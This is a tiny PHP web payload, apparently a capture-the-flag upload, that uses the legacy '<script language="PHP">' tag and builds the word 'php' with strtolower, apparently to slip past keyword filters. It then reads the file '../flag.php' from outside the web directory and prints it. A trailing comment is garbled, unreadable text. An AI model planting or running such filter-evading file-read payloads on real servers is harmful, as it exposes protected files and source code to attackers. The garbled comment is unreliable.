<script language="PHP">
$fh=fopen("../flag.".strtolower("PHP"),'r');
echo fread($fh,filesize("../flag.".strtolower("PHP"))); #���.�����ӷ�����ʼ����+�������ӣ�����ˡ�
fclose($fh);
</script>